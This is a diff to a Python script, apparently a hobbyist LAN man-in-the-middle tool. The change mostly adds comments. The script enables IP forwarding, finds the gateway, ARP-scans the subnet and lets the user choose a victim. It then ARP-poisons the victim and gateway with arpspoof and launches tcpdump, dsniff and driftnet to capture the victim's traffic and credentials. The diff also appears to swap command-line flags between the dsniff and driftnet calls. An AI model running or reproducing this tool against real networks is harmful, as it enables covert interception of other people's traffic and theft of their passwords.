@@ -1,31 +1,28 @@
 #!/usr/bin/env python
+# Imports Section! Some of these are probably unneeded
 import os
 import sys
 import socket
 import struct
 import time
 import subprocess
-from scapy.all import *
-#conf.verb=0
-##############
-### CONFIG ###
-##############
+from scapy.all import * # this may need to be changed depending on your system...
+# End of Imports Section
 # Edit these values... Eventually these will autoconfigure... 
 airmonpath = "/usr/local/sbin/airmon-ng"
 #airmonpath = "os.popen("which airmon-ng")" # if someone can make this work? It would be epic :)
-
-################
-# STOP EDITING #
-################
+#conf.verb=0
+# It is not advised to edit beyond this point
 
 # Function: amiroot()
 def amiroot():
-    if os.geteuid() != 0:
+    if os.geteuid() != 0: # am i root?!?!?!?!
         print("[-] You are not root... Sudo may be of some assistance!")
         sys.exit(1)
     else:
         pass
 
+# Function: Banner - my badass ASCII banner!
 def banner():
     print(" _____ _         ______      _                           ")
     print("|_   _| |        | ___ \    (_)                          ")
@@ -40,7 +37,7 @@ def banner():
 
 # Function: check_airmon()
 def check_airmon(airmonpath):
-    if os.path.isfile(airmonpath) == True:
+    if os.path.isfile(airmonpath) == True: # checks is the airmon path existing
         print("[*] Airmon-ng is installed! This is fine...")
     else:
         print("[-] Airmon-ng not found, quitting!")
@@ -48,16 +45,16 @@ def check_airmon(airmonpath):
 
 # Function: get_ifaces() This works in 3
 def get_ifaces():
-        airmon = os.popen("airmon-ng")
-        ifacelst = airmon.readlines()
+        airmon = os.popen("airmon-ng") # Runs airmon-ng
+        ifacelst = airmon.readlines() # reads it
         li=0
         for line in ifacelst:
-                line = line.replace("Interface\tChipset\t\tDriver","")
-                line = line.strip()
-                inum = li + 1
+                line = line.replace("Interface\tChipset\t\tDriver","") #parsing lines
+                line = line.strip() # stripping the data out
+                inum = li + 1 # more data finding
                 if line:
-                        line = line.split("\t\t")
-                        print (line[0])
+                        line = line.split("\t\t") # splitting again
+                        print (line[0]) # prints interface
                         ifaces = line[0]
                         return ifaces
 
@@ -67,29 +64,29 @@ def ip_forwarding():
         os.popen("echo 1 > /proc/sys/net/ipv4/ip_forward") # Enable IP forwarding
         ipout = open("/proc/sys/net/ipv4/ip_forward" , "r").read() # Checks is it enabled
         time.sleep(1)
-        if ipout[0] == '1':
+        if ipout[0] == '1': # validates enabled...
             print("[+] IP forwarding enabled")
         else:
             print("[-] Something fucked up, forwarding not enabled!")
-            ipout.close()
+            ipout.close() # closes the file...
     except Exception:
         pass
 
 # Function: Get Gateway
 def get_default_gateway_linux():
     """Read the default gateway directly from /proc."""
-    with open("/proc/net/route") as fh:
+    with open("/proc/net/route") as fh: # Opens the /proc/net/route interface
         for line in fh:
-            fields = line.strip().split()
-            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
+            fields = line.strip().split() # splitting shit
+            if fields[1] != '00000000' or not int(fields[3], 16) & 2: # checking data
                 continue
 
-            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
+            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16))) # spits out the gateway!
 
 # Function: makerange(), gets gateway, returns the range
 def makerange(gwaddr):
-    SIP=gwaddr.split('.')
-    iprange = SIP[0] + '.' + SIP[1] + '.' + SIP[2] + '.0/24'
+    SIP=gwaddr.split('.') # Splits the IP address of the gateway
+    iprange = SIP[0] + '.' + SIP[1] + '.' + SIP[2] + '.0/24' # makes a new one that is the range
     return iprange
 
 # ARP scanner function goes here that gets list of possible targets...
@@ -103,14 +100,14 @@ def makerange(gwaddr):
 #    arping("scanrange")
 
 # Function: Arppoison
-def arppoison(iface, target, gwaddr):
+def arppoison(iface, target, gwaddr): # This function will soon be depracated once I get SCAPY to do it for me.
     print("[+] Preparing the ARP Poisoning Suite")
     print("[*]Targetted gateway is " + gwaddr) # Verbosity
     print("[*] Targetted user is " + target) # More verbosity
     print("[*] Interface in use is " + iface) # Even more verbosity :D
-    os.popen("arpspoof -i " + iface + " -t " + target + gwaddr + " & >/dev/null")
+    os.popen("arpspoof -i " + iface + " -t " + target + gwaddr + " & >/dev/null") # I dont like this
     print("[+] Poisoning them bastards")
-    os.popen("arpspoof -i " + iface + " -t " + gwaddr + target + "  & >/dev/null")
+    os.popen("arpspoof -i " + iface + " -t " + gwaddr + target + "  & >/dev/null") # Or this
 
 # Function: tcpdump
 def tcpdumper(iface):
@@ -121,7 +118,7 @@ def tcpdumper(iface):
     elif choose == "y":
         try:
             print("[+] Launching TCPDump in background!")
-            os.popen("xterm -e tcpdump -i " + iface + " -w output.cap &")
+            os.popen("xterm -e tcpdump -i " + iface + " -w output.cap &") # runs it in an xterm... 
         except Exception:
             print("Something Broke!")
             sys.exit(1)
@@ -135,7 +132,7 @@ def launch_dsniff(iface):
     elif choose == "y":
         try:
             print("[+] Launching Dsniff in background!")
-            os.popen("xterm -e dsniff -i " + iface + " &")
+            os.popen("xterm -e dsniff -c -m -i " + iface + " &")
         except Exception:
             print("Something Broke!")
             sys.exit(1)
@@ -149,7 +146,7 @@ def launch_driftnet(iface):
     elif choose == "y":
         try:
             print("[+] Launching Driftnet in background!")
-            os.popen("xterm -e driftnet -c -m -i " + iface + " &")
+            os.popen("xterm -e driftnet -i " + iface + " &")
         except Exception:
             print("Something Broke!")
             sys.exit(1)
@@ -214,7 +211,7 @@ print("[+] Range to scan is: " + scanrange)
 print(arping(scanrange)) # should be a far faster scanner. If it breaks just uncomment the one above :)
 #arpscan(scanrange)
 target = raw_input("Please Select a Target: ")
-arppoison(iface, target, gwaddr)
+arppoison(iface, target, gwaddr) # The arppoison function is due for replacement
 tcpdumper(iface)
 launch_dsniff(iface)
 launch_driftnet(iface)
